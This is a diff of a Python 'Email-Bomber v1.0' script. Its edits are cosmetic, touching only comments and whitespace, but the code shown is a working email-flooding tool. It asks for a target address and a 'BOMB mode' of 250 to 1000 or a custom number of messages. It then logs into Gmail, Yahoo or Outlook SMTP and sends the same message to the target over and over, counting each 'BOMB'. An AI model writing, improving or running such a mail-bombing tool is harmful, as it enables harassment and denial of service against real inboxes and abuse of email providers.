@@ -9,13 +9,15 @@ import sys
 
 
 # Create "Bomb-colors" class to hold color values:
+
 class bcolors:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
 
 
-# Banner for our "BOMB" program, which has color class embedded in print statement for color
+# Banner for our "BOMB" program, which has color class embedded in print statement for color:
+
 def banner():
     print(bcolors.GREEN + "+[+[+[ Email-Bomber v1.0 ]+]+]+")
     print(bcolors.GREEN + "+[+[+[ made with codes ]+]+]+")
@@ -45,14 +47,14 @@ class Email_Bomber:
 
 # Our class attribute
     count = 0
+    
 # Our class constructor
     def __init__(self):
 
 # try/exception block to ensure there are no issues initially:
+
         try:
             print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
-
-# Instance variable that will collect our "target email" from user. Not the typecasting of String:
             self.target = str(input(bcolors.GREEN + "Enter target email <: "))
             self.mode = int(input(bcolors.GREEN + "Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: "))
             if int(self.mode) > int(4) or int(self.mode) < 1:
@@ -85,8 +87,11 @@ class Email_Bomber:
             print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
 
 # Pre-made options listing Yahoo, Google, and Outlook since they all use the SAME port #
+
             self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3: Outlook <:'))
+    
 # Pre-made list of Strings created which correspond to our pre-made list
+
             premade = ['1', '2', '3']
             default_port = True
             if self.server not in premade:
@@ -108,30 +113,36 @@ class Email_Bomber:
             self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
             self.message = str(input(bcolors.GREEN + 'Enter message <: '))
 
-# Formatting from address
+# Formatting from address:
+
             self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
             ''' % (self.fromAddr, self.target, self.subject, self.message)
 
-# Calling SMTP method, passing server and port number as arg parameter
+# Calling SMTP method, passing server and port number as arg parameter:
+
             self.s = smtplib.SMTP(self.server, self.port)
 
 # Extended HELO (EHLO)-  command sent by an email server to identify itself when connecting to another email server
 # to start the process of sending an email. It is followed with the sending email server's domain name.
+
             self.s.ehlo()
 
 # This method is a protocol command used to inform the email server that the email client wants to upgrade from an
-# insecure connection to a secure one using TLS or SSL
+# insecure connection to a secure one using TLS or SSL:
+
             self.s.starttls()
             self.s.ehlo()
             self.s.login(self.fromAddr, self.fromPwd)
         except Exception as e:
             print(f'ERROR: {e}')
-# Send funtion which takes sender's address, target address,and required message. Sends email.
+# Send funtion which takes sender's address, target address,and required message. Sends email:
+
     def send(self):
         try:
             self.s.sendmail(self.fromAddr, self.target, self.msg)
 
-# Traces back to our count variable, which is our class attribute
+# Traces back to our count variable, which is our class attribute:
+
             self.count += 1
             print(bcolors.YELLOW + f'BOMB: {self.count}')
         except Exception as e:
